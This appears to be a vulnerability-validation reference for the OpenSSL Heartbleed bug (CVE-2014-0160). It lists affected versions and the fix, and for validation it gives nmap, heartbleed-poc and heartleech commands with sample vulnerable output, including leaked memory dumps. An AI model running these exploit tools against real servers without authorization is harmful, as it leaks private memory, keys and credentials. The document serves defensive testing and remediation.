# 42430	- OpenSSL Memory Leak Vulnerability (Heartbleed Bug)

<!-- MarkdownTOC -->

- [Description](#description)
- [Solution](#solution)
- [Validation](#validation)
	- [Tools](#tools)
	- [Analysis](#analysis)
		- [Nmap](#nmap)
		- [Heartbleed PoC](#heartbleed-poc)
		- [Heartleech](#heartleech)

<!-- /MarkdownTOC -->


<a name="description"></a>
## Description
OpenSSL is a toolkit that implements the Secure Sockets Layer (SSL v2/v3) and Transport Layer Security (TLS v1) protocols as well as a full-strength general purpose cryptography library. For more details about the detection please refer to the Qualys community article heartbleed-detection-update.
OpenSSL is exposed to a security vulnerability due to a missing bounds check in the handling of the TLS heartbeat extension.
Affected Versions:

OpenSSL 1.0.1f, 1.0.1e, 1.0.1d, 1.0.1c, 1.0.1b, 1.0.1a, 1.0.1

The vulnerabilities can be exploited by malicious users to reveal up to 64kB of memory to a connected client or server that may aid in launching further attacks.

<a name="solution"></a>
## Solution

Update to Version 1.0.1g to resolve this issue. The latest version is available for download fromOpenSSL Web site.

**Workaround:**
- Recompile OpenSSL with the handshake removed from the code by compile time option -DOPENSSL_NO_HEARTBEATS.
<a name="validation"></a>
## Validation

<a name="tools"></a>
### Tools

* **[Nmap](https://nmap.org/download.html):** Nmap ("Network Mapper") is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X. In addition to the classic command-line Nmap executable, the Nmap suite includes an advanced GUI and results viewer (Zenmap), a flexible data transfer, redirection, and debugging tool (Ncat), a utility for comparing scan results (Ndiff), and a packet generation and response analysis tool (Nping).
* *[heartbleed-poc](https://github.com/sensepost/heartbleed-poc)* Test for SSL heartbeat vulnerability (CVE-2014-0160)
* *[heartleech](https://github.com/robertdavidgraham/heartleech)* This is a typical "heartbleed" tool. It can scan for systems vulnerable to the bug, and then be used to download them. Some important features:

<a name="analysis"></a>
### Analysis

<a name="nmap"></a>
#### Nmap 

**Command**

```
nmap --script ssl-heartbleed -p <port> <server ip>
```

**Vulnerable Output**

```
Starting Nmap 7.12SVN ( https://nmap.org ) at 2016-07-07 18:53 EDT
Nmap scan report for <server ip>
Host is up (0.083s latency).
PORT   STATE SERVICE
<port>/tcp open  <service>
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

Nmap done: 1 IP address (1 host up) scanned in 3.04 seconds
```

<a name="heartbleed-poc"></a>
#### Heartbleed PoC

**Command**

```
python heartbleed-poc.py <server ip> -p <port> -s
```

**Vulnerable Output**

```
Scanning <server ip> on port <port>
STARTTLS supported...
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 3311
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Server TLS version was 1.2

Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  --- Truncated ---
  3fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  3ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

WARNING: server <server ip> returned more data than it should - server is vulnerable!  
```


<a name="heartleech"></a>
#### Heartleech

**Command**

```
./bin/kali64/heartleech <server ip> -p <port> -f /dev/stdout
```

**Vulnerable Output**

```
--- heartleech/1.0.0h ---
https://github.com/robertdavidgraham/heartleech
PCRE library: 8.35 2014-04-04
��aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                                     �"�p�)W�B�
�                                              ����ʭ_P%,ih9876�����2�.�*�&���=5����
�/�+�'�#��	������g@?>3210����EDCB�1�-�)�%���</�A���
                                                        ��

:8


 �[�Y�X�B�W�V�u�S�Q�5�L�K���
                            C��+��CNE�H��G�E�D!�y�@�3>�=��9�6s��P"i�'�2�1x�-��(�4��#�"� �.����':�
93 	��0����&�&��:�]M���-�����a=����?�	��)X�����y�0mg`I�YR�IZ<�
I

86

       ��
^C
```
